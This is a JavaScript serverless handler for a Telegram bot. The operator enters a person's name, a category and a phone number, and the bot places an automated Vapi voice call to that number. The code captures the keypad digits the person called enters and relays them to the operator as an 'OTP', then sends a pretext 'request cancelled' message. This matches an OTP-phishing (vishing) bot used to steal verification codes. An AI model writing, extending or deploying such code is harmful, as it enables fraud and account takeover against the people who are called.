const TelegramBot = require("node-telegram-bot-api");
const mongoose = require("mongoose");
const axios = require("axios");

exports.config = {
  api: { bodyParser: true },
};

// ===== ENV VALIDATION =====
const requiredEnv = [
  "MONGO_URI",
  "BOT_TOKEN",
  "VAPI_API_KEY",
  "VAPI_ASSISTANT_ID",
  "VAPI_PHONE_ID",
];

requiredEnv.forEach((key) => {
  if (!process.env[key]) {
    throw new Error(`${key} is missing in environment variables`);
  }
});

// ===== DB CONNECTION =====
let cached = global.mongo;
if (!cached) cached = global.mongo = { conn: null, promise: null };

async function connectDB() {
  if (cached.conn) return cached.conn;
  if (!cached.promise) {
    cached.promise = mongoose.connect(process.env.MONGO_URI);
  }
  cached.conn = await cached.promise;
  return cached.conn;
}

// ===== TELEGRAM BOT =====
let bot;
function getBot() {
  if (!bot) {
    bot = new TelegramBot(process.env.BOT_TOKEN, { polling: false });
  }
  return bot;
}

// ===== USER MODEL =====
const User =
  mongoose.models.User ||
  mongoose.model("User", {
    chatId: String,
    name: String,
    title: String,
    category: String,
    phone: String,
    otp: String,
    status: String,
  });

// ===== VAPI CALL FUNCTION =====
async function callUser(user) {
  try {
    const response = await axios.post(
      "https://api.vapi.ai/call",
      {
        assistantId: process.env.VAPI_ASSISTANT_ID,
        phoneNumberId: process.env.VAPI_PHONE_ID,
        customer: {
          number: user.phone,
        },
        assistantOverrides: {
  variableValues: {
    titleName: `${user.title} ${user.name}`,
    category: user.category,
    otp: user.otp,
  },
},
      },
      {
        headers: {
          Authorization: `Bearer ${process.env.VAPI_API_KEY}`,
          "Content-Type": "application/json",
        },
      }
    );

    console.log("VAPI CALL SUCCESS:", response.data);
  } catch (error) {
    console.error("VAPI ERROR:", error.response?.data || error.message);
    throw error;
  }
}

// ===== MAIN HANDLER =====
module.exports = async function handler(req, res) {
  await connectDB();
  const bot = getBot();
  const body = req.body;

  // ===== TELEGRAM MESSAGE HANDLER =====
  if (body?.message) {
  const chatId = body.message.chat.id;
  const text = body.message.text?.trim();

  if (!text) return res.status(200).send("OK");

  // ===== START =====
  if (text === "/start") {
    await User.deleteOne({ chatId });

    await new User({ chatId, status: "name" }).save();

    await bot.sendMessage(chatId, "Welcome 👋\n\nWhat is your name?");
    return res.status(200).send("OK");
  }

  const user = await User.findOne({ chatId });
  if (!user) return res.status(200).send("OK");

  // ===== NAME STEP =====
  if (user.status === "name") {
    user.name = text;
    user.status = "gender";
    await user.save();

    await bot.sendMessage(chatId, "Are you Male or Female?");
    return res.status(200).send("OK");
  }

  // ===== GENDER STEP =====
  if (user.status === "gender") {
    const gender = text.toLowerCase();

    if (gender === "male") user.title = "Mr";
    else if (gender === "female") user.title = "Ms";
    else {
      await bot.sendMessage(chatId, "Please type Male or Female.");
      return res.status(200).send("OK");
    }

    user.status = "category";
    await user.save();

    await bot.sendMessage(chatId, "Enter your category:");
    return res.status(200).send("OK");
  }

  // ===== CATEGORY STEP =====
  if (user.status === "category") {
    user.category = text;
    user.status = "phone";
    await user.save();

    await bot.sendMessage(
      chatId,
      "Send your phone number with country code.\nExample: +1234567890"
    );
    return res.status(200).send("OK");
  }

  // ===== PHONE STEP =====
  if (user.status === "phone") {
    const cleanedPhone = text.replace(/\s+/g, "");

    user.phone = cleanedPhone;
    user.otp = "123456"; // Replace with real OTP fetch logic
    user.status = "calling";
    await user.save();

    await bot.sendMessage(chatId, "📞 Calling now...");
    await callUser(user);

    return res.status(200).send("OK");
  }
}

// ===== VAPI DTMF HANDLER =====
if (body?.dtmf) {
  const phone = body.customer?.number;
  let digits = body.dtmf;

  // Find the user
  const user = await User.findOne({ phone });
  if (!user) return res.status(200).send("OK");

  // Clean digits
  if (Array.isArray(digits)) {
    digits = digits.join(""); // ["1","2","3"] -> "123"
  } else {
    digits = digits.toString().replace(/\D/g, ""); // remove non-numeric chars
  }

  // Send the digits to Telegram first
  await bot.sendMessage(user.chatId, `🔢 User entered OTP via keypad: ${digits}`);

  // Compare with OTP
  if (digits === user.otp) {
    user.status = "verified";
    await user.save();

    await bot.sendMessage(
      user.chatId,
      "✅ OTP Verified\nYour request has been successfully cancelled."
    );
  } else {
    await bot.sendMessage(user.chatId, "❌ Incorrect OTP entered. Please try again.");
  }
}

return res.status(200).send("OK");
};
